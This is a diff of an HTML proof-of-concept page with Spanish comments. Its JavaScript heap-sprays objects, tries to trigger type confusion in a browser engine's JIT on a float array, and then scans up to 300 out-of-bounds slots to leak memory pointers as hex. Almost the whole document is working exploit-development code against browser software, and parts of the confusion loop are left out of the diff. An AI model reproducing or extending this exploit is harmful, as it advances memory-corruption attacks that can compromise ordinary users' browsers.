@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head><title>PoC Type Confusion + Heap Spray</title></head>
+<head><title>PoC: Heap Spray + Búsqueda de Punteros</title></head>
 <body>
-  <h1>PoC Type Confusion + Heap Spray</h1>
+  <h1>PoC: Heap Spray + Búsqueda de Punteros</h1>
   <pre id="log"></pre>
   <script>
     const log = (msg) => document.getElementById("log").textContent += msg + "\n";
@@ -11,6 +11,7 @@
     let oob;
     let objs = [];
 
+    // Función para representar valores de memoria en formato hexadecimal
     function hex(f) {
       let buf = new ArrayBuffer(8);
       let f64 = new Float64Array(buf);
@@ -19,14 +20,19 @@
       return "0x" + u64[0].toString(16);
     }
 
-    function setup() {
-      // Preparar spray de objetos
+    // Función para realizar el spray de heap
+    function heapSpray() {
       for (let i = 0; i < 10000; i++) {
-        objs.push({a: 13.37, b: i});
+        objs.push({a: i, b: "obj" + i});
       }
+    }
 
+    // Configura el array y realiza la confusión de tipos
+    function setup() {
       float_arr = [1.1, 2.2, 3.3];
+      heapSpray(); // Llenamos el heap con objetos
 
+      // Realizamos la confusión con el array
       function confuse(arr, index, val) {
         for (let i = 0; i < 10000; i++) {
           arr[0] = 1.1;
@@ -35,12 +41,14 @@
         return arr;
       }
 
-      oob = confuse(float_arr, 10, 13.37);
+      // Corrupta el array
+      oob = confuse(float_arr, 150, 13.37);
     }
 
+    // Función para escanear el array corrompido en busca de punteros
     function scan() {
       log("=== Escaneo OOB ===");
-      for (let i = 0; i < 100; i++) {
+      for (let i = 0; i < 300; i++) {
         try {
           let v = oob[i];
           if (typeof v === "number" && v !== 1.1 && v !== 2.2 && v !== 3.3 && v !== 13.37) {
@@ -52,6 +60,7 @@
       }
     }
 
+    // Llamamos a las funciones
     setup();
     scan();
   </script>
